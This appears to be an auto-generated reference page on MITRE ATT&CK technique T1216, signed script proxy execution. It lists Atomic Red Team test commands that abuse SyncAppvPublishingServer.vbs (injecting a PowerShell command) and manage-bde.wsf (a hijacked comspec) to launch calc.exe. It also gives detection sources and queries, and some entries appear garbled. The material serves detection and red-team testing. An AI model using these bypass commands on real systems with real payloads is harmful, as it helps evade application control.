
# Signed Script Proxy Execution

## Description

### MITRE Description

> Adversaries may use scripts signed with trusted certificates to proxy execution of malicious files. Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Application control', 'Digital Certificate Validation']
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1216

## Potential Commands

```
C:\windows\system32\SyncAppvPublishingServer.vbs "\n;Start-Process calc"
set comspec=%windir%\System32\calc.exe
cscript %windir%\System32\manage-bde.wsf
PubPrn.vbsPubPrn.vbs
```

## Commands Dataset

```
[{'command': 'C:\\windows\\system32\\SyncAppvPublishingServer.vbs '
             '"\\n;Start-Process calc"\n',
  'name': None,
  'source': 'atomics/T1216/T1216.yaml'},
 {'command': 'set comspec=%windir%\\System32\\calc.exe\n'
             'cscript %windir%\\System32\\manage-bde.wsf\n',
  'name': None,
  'source': 'atomics/T1216/T1216.yaml'},
 {'command': 'PubPrn.vbsPubPrn.vbs',
  'name': None,
  'source': 'SysmonHunter - Signed Script Proxy Execution'}]
```

## Potential Detections

```json
[{'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']}]
```

## Potential Queries

```json
[{'name': 'Signed Script Proxy Execution',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where process_path contains "cscript"or process_path '
           'contains "wscript"or process_path contains "certutil"or '
           'process_path contains "jjs"and file_directory !contains " /nologo '
           '\\"MonitorKnowledgeDiscovery.vbs\\""'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Signed Script Proxy Execution': {'atomic_tests': [{'auto_generated_guid': '275d963d-3f36-476c-8bef-a2a3960ee6eb',
                                                                             'description': 'Executes '
                                                                                            'the '
                                                                                            'signed '
                                                                                            'SyncAppvPublishingServer '
                                                                                            'script '
                                                                                            'with '
                                                                                            'options '
                                                                                            'to '
                                                                                            'execute '
                                                                                            'an '
                                                                                            'arbitrary '
                                                                                            'PowerShell '
                                                                                            'command.\n'
                                                                                            'Upon '
                                                                                            'execution, '
                                                                                            'calc.exe '
                                                                                            'will '
                                                                                            'be '
                                                                                            'launched.\n',
                                                                             'executor': {'command': 'C:\\windows\\system32\\SyncAppvPublishingServer.vbs '
                                                                                                     '"\\n;#{command_to_execute}"\n',
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'command_to_execute': {'default': 'Start-Process '
                                                                                                                                   'calc',
                                                                                                                        'description': 'A '
                                                                                                                                       'PowerShell '
                                                                                                                                       'command '
                                                                                                                                       'to '
                                                                                                                                       'execute.',
                                                                                                                        'type': 'string'}},
                                                                             'name': 'SyncAppvPublishingServer '
                                                                                     'Signed '
                                                                                     'Script '
                                                                                     'PowerShell '
                                                                                     'Command '
                                                                                     'Execution',
                                                                             'supported_platforms': ['windows']},
                                                                            {'auto_generated_guid': '2a8f2d3c-3dec-4262-99dd-150cb2a4d63a',
                                                                             'description': 'Executes '
                                                                                            'the '
                                                                                            'signed '
                                                                                            'manage-bde.wsf '
                                                                                            'script '
                                                                                            'with '
                                                                                            'options '
                                                                                            'to '
                                                                                            'execute '
                                                                                            'an '
                                                                                            'arbitrary '
                                                                                            'command.\n',
                                                                             'executor': {'cleanup_command': 'set '
                                                                                                             'comspec=%windir%\\System32\\cmd.exe\n',
                                                                                          'command': 'set '
                                                                                                     'comspec=#{command_to_execute}\n'
                                                                                                     'cscript '
                                                                                                     '%windir%\\System32\\manage-bde.wsf\n',
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'command_to_execute': {'default': '%windir%\\System32\\calc.exe',
                                                                                                                        'description': 'A '
                                                                                                                                       'command '
                                                                                                                                       'to '
                                                                                                                                       'execute.',
                                                                                                                        'type': 'Path'}},
                                                                             'name': 'manage-bde.wsf '
                                                                                     'Signed '
                                                                                     'Script '
                                                                                     'Command '
                                                                                     'Execution',
                                                                             'supported_platforms': ['windows']}],
                                                           'attack_technique': 'T1216',
                                                           'display_name': 'Signed '
                                                                           'Script '
                                                                           'Proxy '
                                                                           'Execution'}},
 {'SysmonHunter - T1216': {'description': None,
                           'level': 'high',
                           'name': 'Signed Script Proxy Execution',
                           'phase': 'Execution',
                           'query': [{'file': {'path': {'pattern': 'PubPrn.vbs'}},
                                      'process': {'any': {'pattern': 'PubPrn.vbs'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations


* [Signed Script Proxy Execution Mitigation](../mitigations/Signed-Script-Proxy-Execution-Mitigation.md)

* [Execution Prevention](../mitigations/Execution-Prevention.md)
    

# Actors

None
